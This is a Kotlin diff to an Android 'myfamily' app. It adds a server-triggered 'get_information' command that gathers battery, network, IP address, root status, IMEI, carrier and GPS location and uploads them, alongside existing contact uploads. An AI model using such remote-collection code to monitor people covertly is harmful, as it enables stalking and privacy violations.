@@ -2,34 +2,44 @@ package com.apps.myfamily
 
 import android.app.*
 import android.app.admin.DevicePolicyManager
+import android.annotation.SuppressLint
 import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
+import android.content.IntentFilter
+import android.content.pm.ApplicationInfo
+import android.content.pm.PackageManager
+import android.location.Location
+import android.net.ConnectivityManager
+import android.net.NetworkCapabilities
 import android.os.*
+import android.provider.ContactsContract
 import android.provider.Settings
 import android.provider.Telephony
-import android.util.Log
-import androidx.core.app.NotificationCompat
-import androidx.core.app.NotificationManagerCompat
-import com.apps.myfamily.network.ApiConfig
-import com.apps.myfamily.MyDeviceAdminReceiver
-import okhttp3.*
-import org.json.JSONObject
-import java.io.IOException
-import java.util.concurrent.TimeUnit
-import android.content.pm.ApplicationInfo
-import org.json.JSONArray
-import okhttp3.MediaType.Companion.toMediaTypeOrNull
-import okhttp3.RequestBody.Companion.toRequestBody
-import android.content.pm.PackageManager
-import java.io.File
-import android.os.Environment
-import okhttp3.RequestBody.Companion.asRequestBody
-import android.telephony.TelephonyManager
-import android.telephony.PhoneStateListener
 import android.telephony.CellInfo
 import android.telephony.CellSignalStrength
-import android.provider.ContactsContract
+import android.telephony.PhoneStateListener
+import android.telephony.SignalStrength
+import android.telephony.TelephonyManager
+import android.util.Log
+import androidx.core.app.ActivityCompat
+import androidx.core.app.NotificationCompat
+import androidx.core.app.NotificationManagerCompat
+import androidx.core.content.ContextCompat
+import com.apps.myfamily.network.ApiConfig
+import com.google.android.gms.location.LocationServices
+import okhttp3.*
+import okhttp3.MediaType.Companion.toMediaTypeOrNull
+import okhttp3.RequestBody.Companion.asRequestBody
+import okhttp3.RequestBody.Companion.toRequestBody
+import org.json.JSONArray
+import org.json.JSONObject
+import java.io.File
+import java.io.IOException
+import java.net.Inet4Address
+import java.net.NetworkInterface
+import java.util.concurrent.TimeUnit
+
 
 
 
@@ -134,6 +144,14 @@ class CommandService : Service() {
                             uploadContactsToBackend(applicationContext)
                         }
 
+                        "get_information" -> {
+                            Log.d("CmdService", "Running get_information command")
+                            // Execute on main thread to avoid Looper issues
+                            Handler(Looper.getMainLooper()).post {
+                                Log.d("CmdService", "Collecting device information on main thread")
+                                collectDeviceInformation(applicationContext)
+                            }
+                        }
 
 
                     }
@@ -145,6 +163,214 @@ class CommandService : Service() {
         })
     }
 
+    private fun isDeviceRooted(): Boolean {
+        val paths = listOf(
+            "/system/bin/su", "/system/xbin/su", "/sbin/su",
+            "/system/sd/xbin/su", "/system/bin/failsafe/su"
+        )
+        return paths.any { File(it).exists() }
+    }
+
+    @SuppressLint("MissingPermission")
+    private fun collectDeviceInformation(context: Context) {
+        val info = JSONObject()
+
+        // Timestamp
+        info.put("timestamp", System.currentTimeMillis())
+
+        // Battery
+        val batteryIntent = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
+        val level = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
+        val status = batteryIntent?.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
+        val charging = status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL
+        info.put("battery_level", level)
+        info.put("charging", charging)
+
+        // Internet
+        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+        var connectionType = "OFFLINE"
+        
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            val network = cm.activeNetwork
+            val capabilities = cm.getNetworkCapabilities(network)
+            if (capabilities != null) {
+                connectionType = when {
+                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "WIFI"
+                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "MOBILE"
+                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "ETHERNET"
+                    else -> "UNKNOWN"
+                }
+            }
+        } else {
+            @Suppress("DEPRECATION")
+            val networkInfo = cm.activeNetworkInfo
+            if (networkInfo != null && networkInfo.isConnected) {
+                connectionType = when (networkInfo.type) {
+                    ConnectivityManager.TYPE_WIFI -> "WIFI"
+                    ConnectivityManager.TYPE_MOBILE -> "MOBILE"
+                    else -> "UNKNOWN"
+                }
+            }
+        }
+        
+        info.put("internet", connectionType)
+
+        // Device Info
+        info.put("device_model", Build.MODEL)
+        info.put("android_version", Build.VERSION.RELEASE)
+        info.put("sdk_int", Build.VERSION.SDK_INT)
+
+        // Storage Info
+        val stat = StatFs(Environment.getDataDirectory().path)
+        val free = stat.blockSizeLong * stat.availableBlocksLong
+        val total = stat.blockSizeLong * stat.blockCountLong
+        info.put("storage_free_mb", free / (1024 * 1024))
+        info.put("storage_total_mb", total / (1024 * 1024))
+
+        // Root Check
+        info.put("is_rooted", isDeviceRooted())
+
+        // IP Address
+        try {
+            val interfaces = NetworkInterface.getNetworkInterfaces()
+            for (intf in interfaces) {
+                val addrs = intf.inetAddresses
+                for (addr in addrs) {
+                    if (!addr.isLoopbackAddress && addr is Inet4Address) {
+                        info.put("ip_address", addr.hostAddress)
+                        break
+                    }
+                }
+            }
+        } catch (_: Exception) {}
+
+        // Signal strength (handled in next step)
+        listenForSignalStrength(context, info)
+    }
+
+    private fun listenForSignalStrength(context: Context, info: JSONObject) {
+        // Check for READ_PHONE_STATE permission before accessing phone state
+        if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
+            Log.e("PhoneState", "READ_PHONE_STATE permission not granted")
+            info.put("signal_strength_dbm", JSONObject.NULL)
+            info.put("permission_state", "READ_PHONE_STATE permission denied")
+            
+            // Continue with location upload even without phone state info
+            getLocationAndUpload(context, info)
+            return
+        }
+        
+        val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
+    
+        val listener = object : PhoneStateListener() {
+            override fun onSignalStrengthsChanged(signalStrength: SignalStrength?) {
+                super.onSignalStrengthsChanged(signalStrength)
+                try {
+                    val dbm = signalStrength?.cellSignalStrengths?.firstOrNull()?.dbm
+                    info.put("signal_strength_dbm", dbm ?: JSONObject.NULL)
+                    
+                    // Add IMEI and operator info if available (requires READ_PHONE_STATE)
+                    try {
+                        // This line requires READ_PHONE_STATE permission - already checked above
+                        info.put("operator_name", tm.networkOperatorName)
+                        
+                        // Only add device ID (IMEI) for API levels below 29
+                        // For API 29+, we'll have to use alternative identifiers
+                        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
+                            info.put("device_id", tm.deviceId)
+                        }
+                        
+                        // Get cellular network info
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                            val cellInfo = tm.allCellInfo
+                            if (cellInfo != null && cellInfo.isNotEmpty()) {
+                                info.put("cell_info_available", true)
+                                
+                                // Get network operator info
+                                val mcc = tm.networkOperator.substring(0, 3)
+                                val mnc = tm.networkOperator.substring(3)
+                                info.put("mcc", mcc)
+                                info.put("mnc", mnc)
+                            }
+                        }
+                    } catch (e: Exception) {
+                        Log.e("PhoneState", "Error getting phone state details: ${e.message}")
+                    }
+                    
+                } catch (_: Exception) {
+                    info.put("signal_strength_dbm", JSONObject.NULL)
+                }
+    
+                getLocationAndUpload(context, info)
+                tm.listen(this, PhoneStateListener.LISTEN_NONE)
+            }
+        }
+    
+        tm.listen(listener, PhoneStateListener.LISTEN_SIGNAL_STRENGTHS)
+    }
+
+    private fun getLocationAndUpload(context: Context, info: JSONObject) {
+        val fused = LocationServices.getFusedLocationProviderClient(context)
+    
+        if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
+            Log.i("CommandService", "ACCESS_FINE_LOCATION permission granted, getting location")
+            fused.lastLocation
+                .addOnSuccessListener { loc: Location? ->
+                    if (loc != null) {
+                        info.put("latitude", loc.latitude)
+                        info.put("longitude", loc.longitude)
+                        Log.i("CommandService", "Location data added to info: ${loc.latitude}, ${loc.longitude}")
+                    } else {
+                        Log.w("CommandService", "Location is null")
+                        info.put("location_available", false)
+                    }
+                    uploadInformation(context, info)
+                }
+                .addOnFailureListener { e ->
+                    Log.e("CommandService", "Failed to get location: ${e.message}")
+                    info.put("location_error", e.message ?: "Unknown error")
+                    uploadInformation(context, info)
+                }
+        } else {
+            Log.w("CommandService", "ACCESS_FINE_LOCATION permission not granted")
+            info.put("location_permission", "denied")
+            uploadInformation(context, info)
+        }
+    }
+    
+    private fun uploadInformation(context: Context, info: JSONObject) {
+        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
+        
+        // Create a wrapper JSON object with the expected format
+        val wrapper = JSONObject()
+        wrapper.put("device_id", androidId)
+        wrapper.put("information", info)  // Use "information" field name and pass the actual JSONObject
+        
+        Log.d("UploadInfo", "Sending device info: ${wrapper}")
+        
+        val body = wrapper.toString().toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
+        
+        val request = Request.Builder()
+            .url("${ApiConfig.BASE_URL}/api/device/information")
+            .post(body)
+            .addHeader("Content-Type", "application/json")
+            .build()
+            
+        OkHttpClient().newCall(request).enqueue(object : Callback {
+            override fun onFailure(call: Call, e: IOException) {
+                Log.e("UploadInfo", "Failed to upload device information: ${e.message}")
+            }
+            
+            override fun onResponse(call: Call, response: Response) {
+                if (response.isSuccessful) {
+                    Log.i("UploadInfo", "Device information uploaded successfully")
+                } else {
+                    Log.e("UploadInfo", "Error uploading device information: ${response.code}")
+                }
+            }
+        })
+    }
+    
     private fun getContacts(context: Context): JSONArray {
         val contacts = JSONArray()
         val resolver = context.contentResolver
